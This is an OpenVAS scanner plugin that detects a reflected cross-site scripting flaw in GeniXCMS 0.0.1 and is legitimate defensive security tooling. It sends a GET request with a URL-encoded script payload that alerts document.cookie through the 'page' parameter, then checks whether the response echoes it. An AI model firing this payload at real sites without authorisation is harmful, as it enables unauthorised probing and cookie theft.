###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_genixcms_mult_vuln.nasl 5799 2017-03-30 15:26:21Z cfi $
#
# GeniXCMS Multiple Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805495");
  script_version("$Revision: 5799 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-03-30 17:26:21 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2015-03-17 14:25:35 +0530 (Tue, 17 Mar 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("GeniXCMS Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with GeniXCMS
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to improper input sanitization
  of user supplied input to the 'page' parameter by genixcms/index.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.

  Impact Level: Application");

  script_tag(name:"affected", value:"GeniXCMS 0.0.1.");

  script_tag(name: "solution" , value:"No Solution or patch is available as of
  17th March, 2015.Information regarding this issue will updated once the
  solution details are available.
  For updates refer to http://www.genixcms.org");

  script_tag(name:"solution_type", value:"NoneAvailable");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36321/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/130771/");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

# Variable Initialization
http_port = "";
sndReq = "";
rcvRes = "";

http_port = get_http_port(default:80);
if( !can_host_php( port:http_port ) ) exit( 0 );

foreach dir( make_list_unique( "/", "/genixcms", "/cms", cgi_dirs( port:http_port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/index.php";
  rcvRes = http_get_cache( item:url, port:http_port );

  ##Confirm Application
  if(rcvRes && rcvRes =~ "content.*GeniXCMS") {

    host = http_host_name( port:http_port );

    ##Construct Attack Request
    url = dir + "/index.php/?page=1%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E";
    sndReq = string("GET ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    ## Try attack and check the response to confirm vulnerability
    if(rcvRes =~ "HTTP/1\.. 200" && "><script>alert(document.cookie)</script>" >< rcvRes)
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
